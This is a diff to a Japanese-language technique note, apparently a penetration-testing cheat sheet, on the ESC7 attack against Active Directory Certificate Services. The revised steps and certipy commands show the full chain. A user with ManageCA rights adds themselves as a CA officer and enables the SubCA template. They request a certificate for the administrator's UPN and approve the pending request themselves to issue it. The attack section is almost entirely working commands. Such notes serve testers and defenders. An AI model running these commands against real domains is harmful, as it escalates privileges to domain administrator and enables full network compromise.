@@ -16,15 +16,22 @@ ESC7 は、CA（証明書発行局）に対する `ManageCA` や `ManageCertific
 ## 手順
 
 1. 対象 CA に対する `ManageCA` または `ManageCertificates` 権限を持っているか確認する。
-2. `ManageCA` 権限があれば、`EDITF_ATTRIBUTESUBJECTALTNAME2` などの危険フラグを有効化し、以降は ESC6 と同じ手順で悪用する。
-3. `ManageCertificates` 権限があれば、拒否されたはずの証明書要求（SAN に管理者を指定したものなど）を手動で承認して発行させる。
+2. `ManageCA` 権限があれば、自分を CA の管理者（officer）に追加して `ManageCertificates` 権限も得たうえで、`SubCA` テンプレートを有効にする。
+3. `SubCA` テンプレートで、管理者の UPN を指定して証明書を要求する（拒否されて保留になる）。
+4. `ManageCertificates` 権限で保留中の要求を承認し、証明書を取得する。
 
 ## コマンド
 
 ```
-# ManageCA 権限で危険フラグを有効化（ESC6 化）
-certipy ca -u user@corp.local -p 'Password123' -ca 'CORP-CA' -dc-ip <DC_IP> \
-  -enable-template 'SubCA'
+# ManageCA 権限で自分を officer に追加し、SubCA テンプレートを有効化
+certipy ca -u user@lab.local -p 'Password123' -ca 'LAB-CA' -dc-ip <DC_IP> -add-officer user
+certipy ca -u user@lab.local -p 'Password123' -ca 'LAB-CA' -dc-ip <DC_IP> -enable-template 'SubCA'
+# SubCA で管理者の証明書を要求（拒否され、要求 ID が表示される）
+certipy req -u user@lab.local -p 'Password123' -ca 'LAB-CA' -target <CA_HOST> \
+  -template 'SubCA' -upn administrator@lab.local
+# 保留中の要求を承認して取得
+certipy ca -u user@lab.local -p 'Password123' -ca 'LAB-CA' -dc-ip <DC_IP> -issue-request <REQUEST_ID>
+certipy req -u user@lab.local -p 'Password123' -ca 'LAB-CA' -target <CA_HOST> -retrieve <REQUEST_ID>
 ```
 
 ## 注意点
